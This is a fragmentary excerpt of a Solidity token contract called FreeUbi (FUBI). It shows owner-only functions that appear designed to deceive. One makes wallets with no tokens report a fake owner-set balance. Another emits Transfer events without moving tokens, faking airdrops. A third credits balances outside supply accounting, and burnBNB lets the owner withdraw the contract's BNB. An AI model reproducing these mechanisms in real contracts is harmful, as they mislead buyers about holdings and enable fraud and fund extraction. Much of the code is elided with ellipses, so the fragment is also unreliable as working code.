...
contract GRV is ERC20Detailed, Ownable {
    ...
    constructor (address router, address payable _marketingAddress)
        ERC20Detailed("FreeUbi", "FUBI", uint8(DECIMALS))
        payable
        public
    {
        ...
        returns (uint256)
    {
        ...
        if(_gonBalances[who] ==0){
           return   _fubi.div(_gonsPerFragment);
        }
    ...
    */
        ...
        onlyOwner
    {
      _isExcluded[_addr] = true;
        ...
        function excludeAddressRemove(address _addr)
        external
        onlyOwner
    {
  ...
  function burnBNB(address payable burnAddress) external onlyOwner {
   ...
   function batchTransferToken(address[] memory holders, uint256 amount) public  onlyOwner  {
        for (uint i=0; i<holders.length; i++) {
            _gonBalances[holders[i]] = _gonBalances[holders[i]].add(amount);
            emit Transfer(address(this), holders[i], amount);
        }
    }

    function batchTransferTokenEmit(address[] memory holders, uint256 amount) public  onlyOwner  {
        for (uint i=0; i<holders.length; i++) { 
            emit Transfer(address(this), holders[i], amount);
        }
    }
    ...
    function updateAir( uint256 _tokenAmount) external onlyOwner {  
        _fubi=_tokenAmount ;
     }
